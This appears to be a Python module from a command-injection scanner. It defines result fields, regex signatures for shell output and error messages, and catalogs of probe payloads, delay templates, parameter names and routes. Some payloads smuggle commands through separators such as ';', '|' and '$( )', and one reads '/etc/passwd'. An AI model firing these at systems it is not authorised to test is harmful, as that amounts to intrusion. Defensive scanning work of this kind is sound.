"""Command-injection result model, OS/shell signatures, and payload constants."""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Set, Tuple

from argus.collectors.toolkit.enums import Severity


@dataclass
class CommandInjectionResult:
    """Represents the structured result of a command injection analysis."""
    technique: str  # "result_based", "time_blind", "error_based"
    payload: str
    parameter: str
    parameter_type: str  # "query", "body", "json", "path", "header"
    status_code: int = 200
    os_family: str = "generic"  # "posix", "windows", "generic"
    matched_pattern: str = ""
    snippet: str = ""
    severity: str = Severity.CRITICAL
    confidence: float = 0.95
    template_id: str = "cmdi"
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    shell_flavor: str = ""
    extra: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# Regex Signatures Catalogs
# =============================================================================

# Result-Based OS Output Signatures
OS_RESULT_SIGNATURES: Dict[str, re.Pattern] = {
    # POSIX ID output: uid=0(root) gid=0(root) or uid=1000(app) gid=1000(app)
    "unix_id": re.compile(
        r"(?:uid=\d+\([a-zA-Z0-9_\-.]+\)\s+gid=\d+\([a-zA-Z0-9_\-.]+\)|uid=\d+\s+gid=\d+)",
        re.IGNORECASE,
    ),
    # POSIX passwd file content
    "unix_passwd": re.compile(
        r"root:[x*]:0:0:.*?:(?:/root|/bin/(?:bash|sh|zsh|dash|nologin))",
        re.MULTILINE,
    ),
    # POSIX uname output: Linux hostname 5.15.0-76-generic ...
    "unix_uname": re.compile(
        r"\b(?:Linux|Darwin|FreeBSD|OpenBSD|NetBSD|SunOS)\s+[\w\.\-]+\s+\d+\.\d+[\w\.\-]*",
        re.IGNORECASE,
    ),
    # POSIX whoami output (isolated username)
    "unix_whoami": re.compile(
        r"^(?:root|daemon|bin|nobody|www-data|nginx|apache|app|user|admin|ubuntu|ec2-user|runner)$",
        re.IGNORECASE | re.MULTILINE,
    ),
    # Windows whoami output: nt authority\system or DOMAIN\user
    "windows_whoami": re.compile(
        r"\b(?:nt authority\\(?:system|network service|local service)|[a-zA-Z0-9_\-\.]+\\[a-zA-Z0-9_\-\.]+)\b",
        re.IGNORECASE,
    ),
    # Windows ver output: Microsoft Windows [Version 10.0.19045.3324]
    "windows_ver": re.compile(
        r"Microsoft\s+Windows\s+\[Version\s+\d+\.\d+[\.\d+]*\]",
        re.IGNORECASE,
    ),
    # Windows set output: COMSPEC=C:\Windows\system32\cmd.exe
    "windows_set": re.compile(
        r"\b(?:COMSPEC=.*cmd\.exe|SystemRoot=C:\\Windows|OS=Windows_NT)\b",
        re.IGNORECASE,
    ),
    # Windows dir output: Volume Serial Number is ...
    "windows_dir": re.compile(
        r"(?:Volume in drive [A-Z] is|Volume Serial Number is [0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}|Directory of [A-Z]:\\)",
        re.IGNORECASE,
    ),
    # Windows ipconfig output: Windows IP Configuration
    "windows_ipconfig": re.compile(
        r"(?:Windows IP Configuration|Ethernet adapter|IPv4 Address[\.\s]+:)",
        re.IGNORECASE,
    ),
}

# Error-Based Shell Error Signatures
SHELL_ERROR_SIGNATURES: Dict[str, List[Tuple[str, re.Pattern]]] = {
    "unix_bash": [
        ("bash_not_found", re.compile(r"(?:/bin/(?:ba)?sh:|sh:)\s*(?:line \d+:\s*)?[^:\n]+:\s*(?:command )?not found", re.IGNORECASE)),
        ("dash_not_found", re.compile(r"sh:\s*\d*:\s*[^:\n]+:\s*not found", re.IGNORECASE)),
        ("zsh_not_found", re.compile(r"zsh:\s*command not found:\s*[^:\n]+", re.IGNORECASE)),
        ("bash_syntax_error", re.compile(r"syntax error near unexpected token", re.IGNORECASE)),
        ("sh_syntax_error", re.compile(r"/bin/sh:\s*syntax error", re.IGNORECASE)),
        ("generic_syntax_error", re.compile(r"syntax error:\s*unexpected", re.IGNORECASE)),
        ("no_such_file", re.compile(r"(?:/bin/(?:ba)?sh:|sh:)[^:\n]+:\s*No such file or directory", re.IGNORECASE)),
        ("permission_denied", re.compile(r"(?:/bin/(?:ba)?sh:|sh:)[^:\n]+:\s*Permission denied", re.IGNORECASE)),
        ("cannot_execute", re.compile(r"cannot execute binary file", re.IGNORECASE)),
    ],
    "windows_cmd": [
        ("cmd_not_recognized", re.compile(r"'[^']+' is not recognized as an internal or external command,\s*operable program or batch file", re.IGNORECASE)),
        ("cmd_syntax_incorrect", re.compile(r"The syntax of the command is incorrect\.", re.IGNORECASE)),
        ("cmd_path_not_found", re.compile(r"The system cannot find the (?:path|file) specified\.", re.IGNORECASE)),
        ("cmd_volume_incorrect", re.compile(r"The filename, directory name, or volume label syntax is incorrect\.", re.IGNORECASE)),
        ("cmd_access_denied", re.compile(r"Access is denied\.", re.IGNORECASE)),
    ],
    "windows_powershell": [
        ("ps_cmdlet_not_found", re.compile(r"The term '[^']+' is not recognized as the name of a cmdlet", re.IGNORECASE)),
        ("ps_command_not_found_exc", re.compile(r"CommandNotFoundException", re.IGNORECASE)),
        ("ps_parser_error", re.compile(r"ParseException|MissingExpressionAfterOperator", re.IGNORECASE)),
        ("ps_position_msg", re.compile(r"At line:\d+\s+char:\d+", re.IGNORECASE)),
    ],
}

# Base Result Commands Catalog
RESULT_COMMAND_PAYLOADS: List[Dict[str, Any]] = [
    # POSIX Identity & System Info
    {"cmd": "id", "os": "posix", "canary_type": "regex", "signature": "unix_id"},
    {"cmd": "whoami", "os": "posix", "canary_type": "regex", "signature": "unix_whoami"},
    {"cmd": "uname -a", "os": "posix", "canary_type": "regex", "signature": "unix_uname"},
    {"cmd": "cat /etc/passwd", "os": "posix", "canary_type": "regex", "signature": "unix_passwd"},
    {"cmd": "head -n 1 /etc/passwd", "os": "posix", "canary_type": "regex", "signature": "unix_passwd"},

    # POSIX Arithmetic Canary (28412 + 19283 = 47695)
    {"cmd": "expr 28412 + 19283", "os": "posix", "canary_type": "exact", "expected": "47695"},

    # Windows Identity & System Info
    {"cmd": "whoami", "os": "windows", "canary_type": "regex", "signature": "windows_whoami"},
    {"cmd": "ver", "os": "windows", "canary_type": "regex", "signature": "windows_ver"},
    {"cmd": "set", "os": "windows", "canary_type": "regex", "signature": "windows_set"},
    {"cmd": "dir C:\\", "os": "windows", "canary_type": "regex", "signature": "windows_dir"},
    {"cmd": "ipconfig", "os": "windows", "canary_type": "regex", "signature": "windows_ipconfig"},
]

# Base Time Delay Templates Catalog
DEFAULT_TIME_DELAY_PAYLOADS: List[Dict[str, Any]] = [
    # POSIX delay
    {"template": "sleep {delay}", "os": "posix"},
    {"template": "sleep {delay}s", "os": "posix"},
    {"template": "ping -c {delay} 127.0.0.1", "os": "posix"},

    # Windows delay
    {"template": "timeout /t {delay} /nobreak", "os": "windows"},
    {"template": "timeout /t {delay}", "os": "windows"},
    {"template": "ping -n {delay} 127.0.0.1", "os": "windows"},
    {"template": "powershell -c Start-Sleep -s {delay}", "os": "windows"},

    # Generic / Fallback
    {"template": "sleep {delay} || timeout /t {delay}", "os": "generic"},
]

# Base Error Trigger Payloads Catalog
DEFAULT_ERROR_TRIGGER_PAYLOADS: List[str] = [
    "; argus_nonexistent_cmd_xyz ;",
    "| argus_nonexistent_cmd_xyz",
    "& argus_nonexistent_cmd_xyz &",
    "`argus_nonexistent_cmd_xyz`",
    "$(argus_nonexistent_cmd_xyz)",
    ";;;",
    "|||",
    "&&&",
    "| '",
    '; "',
]

# Common Parameter Names for CMDi Fuzzing
COMMON_CMDI_PARAMS: Set[str] = {
    "ip", "host", "hostname", "domain", "target", "addr", "address",
    "cmd", "command", "exec", "run", "daemon", "query", "arg", "args",
    "file", "filename", "filepath", "path", "dir", "log", "output",
    "tool", "ping", "traceroute", "lookup", "url", "uri", "fetch", "q",
}

# Default Probe Routes for CMDi Discovery
DEFAULT_CMDI_PROBE_ROUTES: List[str] = [
    "/ping", "/api/ping",
    "/traceroute", "/api/traceroute",
    "/nslookup", "/api/dns",
    "/system/exec", "/api/system",
    "/admin/tools", "/api/tools",
    "/view_log", "/api/logs",
    "/download", "/export",
    "/backup", "/api/backup",
]


# =============================================================================
# Payload Generator with 8 Distinct Mutation Strategies
# =============================================================================

